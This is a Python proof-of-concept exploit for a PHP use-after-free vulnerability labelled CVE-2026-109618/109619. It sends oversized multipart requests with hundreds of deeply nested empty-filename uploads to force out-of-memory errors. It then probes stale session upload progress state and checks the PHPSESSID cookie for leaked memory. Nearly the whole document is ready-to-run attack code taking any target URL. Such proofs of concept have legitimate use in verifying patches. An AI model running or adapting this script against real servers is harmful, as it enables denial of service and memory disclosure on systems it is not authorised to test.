#!/usr/bin/env python3
"""
CVE-2026-109618/109619 — PHP2Shell OOM + Session Upload Progress PoC

Demonstrates the heap use-after-free vulnerability via:
  Phase 1: OOM trigger through nested empty-filename uploads
  Phase 2: Stale session state probe

Requirements:
  - Python 3.6+
  - requests library (pip install requests)
  - Target PHP < 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35
  - session.upload_progress.enabled = On (default)

Usage:
  python3 php2shell_oom_poc.py <TARGET_URL> [--attempts N] [--uploads N]

Examples:
  python3 php2shell_oom_poc.py http://localhost/index.php
  python3 php2shell_oom_poc.py https://target.example.com/index.php --attempts 5
"""

import argparse
import os
import random
import string
import time
import urllib.parse

try:
    import requests
except ImportError:
    print("Error: 'requests' library required. Install: pip install requests")
    exit(1)


def rand_str(n=16):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def build_oom_body(boundary, num_uploads=800, nesting_depth=40):
    """
    Build multipart body designed to trigger OOM via empty-upload memory expansion.
    
    Key insight (Calif research):
      - filename="" parts are NOT counted toward max_file_uploads
      - PHP creates 6 $_FILES entries per part, each with nested HashTables
      - 800 parts × 40-deep nesting × 6 entries → >128M memory from ~230KB body
    """
    parts = []
    
    # PHP_SESSION_UPLOAD_PROGRESS field (triggers session upload progress handler)
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"trigger_{rand_str(8)}\r\n"
    )
    
    # Empty-filename uploads with deeply nested names
    for i in range(num_uploads):
        nest = "".join(f"[{rand_str(2)}]" for _ in range(nesting_depth))
        name = f"f{nest}[{i}]"
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{name}"; filename=""\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
            f"\r\n"
        )
    
    parts.append(f"--{boundary}--\r\n")
    return "".join(parts).encode()


def build_probe_body(boundary):
    """Phase 2 probe: PHP_SESSION_UPLOAD_PROGRESS without file part."""
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"probe_{rand_str(8)}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="dummy"\r\n\r\n'
        f"value\r\n"
        f"--{boundary}--\r\n"
    ).encode()


def analyze_cookie(response):
    """Check for memory disclosure in PHPSESSID cookie."""
    sc = response.headers.get("set-cookie", "")
    if "PHPSESSID=" in sc:
        sv = sc.split("PHPSESSID=")[1].split(";")[0]
        if len(sv) > 40 or any(c not in string.ascii_lowercase + string.digits + "-" for c in sv):
            return True, sv
    return False, ""


def main():
    parser = argparse.ArgumentParser(
        description="PHP2Shell OOM + Session Upload Progress PoC"
    )
    parser.add_argument("url", help="Target URL (e.g., http://target/index.php)")
    parser.add_argument("--attempts", type=int, default=10, help="Number of attempts (default: 10)")
    parser.add_argument("--uploads", type=int, default=800, help="Empty upload fields per request (default: 800)")
    parser.add_argument("--nesting", type=int, default=40, help="Nesting depth (default: 40)")
    parser.add_argument("--gap", type=float, default=0.1, help="Delay between Phase 1 and 2 (default: 0.1s)")
    args = parser.parse_args()

    print("=" * 70)
    print("  CVE-2026-109618/109619 — PHP2Shell OOM PoC")
    print("=" * 70)
    print(f"  Target   : {args.url}")
    print(f"  Attempts : {args.attempts}")
    print(f"  Uploads  : {args.uploads} × depth-{args.nesting}")
    print()

    results = {"oom": 0, "crash_p2": 0, "leak": 0, "normal": 0}

    for i in range(args.attempts):
        sessid = rand_str(26)
        print(f"\n--- Attempt {i+1}/{args.attempts} (PHPSESSID={sessid}) ---")

        # Phase 1: OOM trigger
        boundary = f"php2shell-{rand_str(16)}"
        body = build_oom_body(boundary, args.uploads, args.nesting)
        print(f"  [P1] Sending OOM trigger ({len(body)} bytes)...")

        try:
            resp = requests.post(
                args.url,
                data=body,
                headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "Cookie": f"PHPSESSID={sessid}",
                },
                timeout=30,
                allow_redirects=False,
            )
            print(f"  [P1] HTTP {resp.status_code}")

            if resp.status_code in (500, 502, 503):
                results["oom"] += 1
                print("  [P1] ✓ OOM/crash signal!")

            leaked, data = analyze_cookie(resp)
            if leaked:
                results["leak"] += 1
                print(f"  [P1] ✓✓ MEMORY LEAK: {data[:80]}...")

        except Exception as e:
            print(f"  [P1] Exception: {e}")
            results["oom"] += 1

        time.sleep(args.gap)

        # Phase 2: Stale state probe
        boundary2 = f"probe-{rand_str(16)}"
        probe = build_probe_body(boundary2)
        print(f"  [P2] Probing stale state...")

        try:
            resp2 = requests.post(
                args.url,
                data=probe,
                headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary2}",
                    "Cookie": f"PHPSESSID={sessid}",
                },
                timeout=15,
                allow_redirects=False,
            )
            print(f"  [P2] HTTP {resp2.status_code}")

            if resp2.status_code in (500, 502, 503):
                results["crash_p2"] += 1
                print("  [P2] ✓ Stale state crash!")
            else:
                results["normal"] += 1

            leaked2, data2 = analyze_cookie(resp2)
            if leaked2:
                results["leak"] += 1
                print(f"  [P2] ✓✓ MEMORY LEAK: {data2[:80]}...")

        except Exception as e:
            print(f"  [P2] Exception: {e}")
            results["crash_p2"] += 1

        time.sleep(0.3)

    # Summary
    print(f"\n{'='*70}")
    print(f"  RESULTS")
    print(f"  OOM triggers (Phase 1) : {results['oom']}/{args.attempts}")
    print(f"  Stale crashes (Phase 2): {results['crash_p2']}/{args.attempts}")
    print(f"  Memory leaks           : {results['leak']}")
    print(f"  Normal responses       : {results['normal']}")
    print()
    if results["oom"] > 0:
        print("  [VULNERABLE] PHP2Shell OOM confirmed")
    if results["leak"] > 0:
        print("  [CRITICAL] Memory disclosure via PHPSESSID cookie")
    if results["crash_p2"] > 0:
        print("  [CRITICAL] Stale state consumed — UAF confirmed")
    if results["oom"] == 0:
        print("  [NOT VULNERABLE] No OOM signals — target may be patched")
    print(f"{'='*70}")


if __name__ == "__main__":
    main()
